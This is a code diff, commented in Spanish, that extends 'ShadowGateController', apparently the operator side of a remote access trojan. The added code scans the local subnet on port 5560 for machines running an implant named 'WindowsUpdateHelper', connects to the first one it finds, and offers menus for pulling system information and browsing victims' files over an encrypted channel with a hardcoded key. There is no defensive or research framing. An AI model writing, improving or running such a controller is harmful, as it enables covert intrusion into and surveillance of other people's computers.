@@ -3,9 +3,12 @@
 import socket
 import json
 import struct
+import threading
 from cryptography.fernet import Fernet
 from termcolor import colored
 import pyfiglet
+import netifaces
+import time
 
 
 class ShadowGateController:
@@ -18,6 +21,67 @@ class ShadowGateController:
         self.encryption_key = 'EbFqsf2CJ6a8pRHtKiHe-V6R9uMXvPEO627-wzsx_k4='
         self.cipher = Fernet(self.encryption_key)
 
+    def scan_network(self):
+        """Escanear la red en busca de objetivos con WindowsUpdateHelper"""
+        print(colored("🔍 Escaneando red en busca de objetivos...", 'yellow'))
+
+        try:
+            # Obtener red local
+            gateway = netifaces.gateways()['default'][netifaces.AF_INET][0]
+            network = '.'.join(gateway.split('.')[:3]) + '.'
+
+            targets_found = []
+
+            # Escanear en hilos para mayor velocidad
+            def check_ip(ip):
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(1)
+                    result = sock.connect_ex((ip, 5560))
+                    sock.close()
+
+                    if result == 0:
+                        targets_found.append(ip)
+                        print(colored(f"   ✅ Objetivo encontrado: {ip}", 'green'))
+                except:
+                    pass
+
+            # Crear hilos para escaneo
+            threads = []
+            for i in range(1, 255):
+                ip = network + str(i)
+                thread = threading.Thread(target=check_ip, args=(ip,))
+                threads.append(thread)
+                thread.start()
+
+                # Limitar número de hilos simultáneos
+                if len(threads) >= 50:
+                    for t in threads:
+                        t.join()
+                    threads = []
+
+            # Esperar hilos restantes
+            for thread in threads:
+                thread.join()
+
+            return targets_found
+
+        except Exception as e:
+            print(colored(f"❌ Error escaneando red: {e}", 'red'))
+            return []
+
+    def auto_connect(self):
+        """Conectar automáticamente al primer objetivo encontrado"""
+        targets = self.scan_network()
+
+        if not targets:
+            print(colored("❌ No se encontraron objetivos en la red", 'red'))
+            return False
+
+        # Conectar al primer objetivo encontrado
+        target_ip = targets[0]
+        return self.connect(target_ip)
+
     def connect(self, target_ip):
         """Conectar al objetivo"""
         try:
@@ -29,7 +93,7 @@ class ShadowGateController:
             print(colored(f"✅ Conectado a {target_ip}", 'green'))
             return True
         except Exception as e:
-            print(colored(f"❌ Error conectando: {e}", 'red'))
+            print(colored(f"❌ Error conectando a {target_ip}: {e}", 'red'))
             return False
 
     def send_command(self, command_type, data=None):
@@ -93,7 +157,7 @@ class ShadowGateController:
         print("=" * 60)
 
     def interactive_menu(self):
-        """Menú interactivo simple"""
+        """Menú interactivo mejorado con detección automática"""
         self.show_banner()
 
         while True:
@@ -102,24 +166,33 @@ class ShadowGateController:
             print("=" * 50)
 
             if self.target_ip:
-                print(colored(f"Objetivo: {self.target_ip}", 'green'))
+                print(colored(f"✅ Conectado a: {self.target_ip}", 'green'))
             else:
-                print(colored("Sin objetivo conectado", 'yellow'))
+                print(colored("❌ Sin conexión", 'yellow'))
 
-            print("1. 📡 Conectar a objetivo")
-            print("2. 🖥️  Información del sistema")
-            print("3. 📁 Explorar archivos")
-            print("4. 🚪 Desconectar")
+            print("1. 🔍 Escanear y conectar automáticamente")
+            print("2. 📡 Conectar a IP específica")
+            print("3. 🖥️  Información del sistema")
+            print("4. 📁 Explorar archivos")
+            print("5. 🚪 Desconectar")
+            print("6. 🔄 Re-escanear objetivos")
             print("0. 🏃 Salir")
             print("=" * 50)
 
             choice = input("👉 Selecciona opción: ").strip()
 
             if choice == "1":
-                target = input("IP del objetivo: ").strip()
-                self.connect(target)
+                if self.auto_connect():
+                    print(colored("🎯 Conexión automática exitosa!", 'green'))
+                else:
+                    print(colored("❌ No se pudo conectar automáticamente", 'red'))
 
-            elif choice == "2" and self.connected:
+            elif choice == "2":
+                target = input("IP del objetivo: ").strip()
+                if target:
+                    self.connect(target)
+
+            elif choice == "3" and self.connected:
                 result = self.get_system_info()
                 if result and result.get('success'):
                     print(colored("🖥️  System Info:", 'green'))
@@ -127,7 +200,7 @@ class ShadowGateController:
                 else:
                     print(colored("❌ Error obteniendo información", 'red'))
 
-            elif choice == "3" and self.connected:
+            elif choice == "4" and self.connected:
                 path = input("Ruta (ej: C:\\Users): ").strip() or "C:\\"
                 result = self.file_explorer(path)
                 if result and result.get('success'):
@@ -136,12 +209,19 @@ class ShadowGateController:
                 else:
                     print(colored("❌ Error listando archivos", 'red'))
 
-            elif choice == "4":
+            elif choice == "5":
                 if self.socket:
                     self.socket.close()
                 self.connected = False
                 self.target_ip = None
                 print(colored("🔌 Desconectado", 'yellow'))
+
+            elif choice == "6":
+                targets = self.scan_network()
+                if targets:
+                    print(colored(f"🎯 Objetivos encontrados: {targets}", 'green'))
+                else:
+                    print(colored("❌ No se encontraron objetivos", 'red'))
 
             elif choice == "0":
                 print(colored("👋 Saliendo...", 'blue'))
@@ -154,28 +234,42 @@ class ShadowGateController:
 
 
 # Función de prueba rápida
-def test_connection(target_ip):
-    """Probar conexión rápidamente"""
+def test_connection():
+    """Probar conexión automática"""
     controller = ShadowGateController()
 
-    if controller.connect(target_ip):
-        print("\n🧪 Probando comandos...")
+    print(colored("🧪 Iniciando prueba automática...", 'yellow'))
 
-        # Systeminfo
-        print("1. Obteniendo systeminfo...")
+    if controller.auto_connect():
+        print("\n✅ Conexión automática exitosa!")
+
+        # Probar comando simple
+        print("🧪 Probando comando systeminfo...")
         info = controller.get_system_info()
         if info and info.get('success'):
-            print("✅ Systeminfo funcionando")
-            print(info.get('output', '')[:200] + "...")  # Primeros 200 caracteres
+            print("✅ Systeminfo funcionando correctamente")
+            # Mostrar información básica del sistema
+            lines = info.get('output', '').split('\n')
+            for line in lines[:5]:  # Primeras 5 líneas
+                if line.strip():
+                    print(f"   {line}")
         else:
-            print("❌ Systeminfo falló")
+            print("❌ Error ejecutando systeminfo")
 
         controller.socket.close()
     else:
-        print("❌ No se pudo conectar")
+        print("❌ No se pudo conectar automáticamente")
 
 
 if __name__ == "__main__":
     # Ejecutar menú interactivo
     controller = ShadowGateController()
+
+    # Primero intentar conexión automática
+    print(colored("🔄 Intentando conexión automática...", 'yellow'))
+    if controller.auto_connect():
+        print(colored("✅ Conectado automáticamente!", 'green'))
+    else:
+        print(colored("ℹ️  Usa el menú para conectar manualmente", 'yellow'))
+
     controller.interactive_menu()
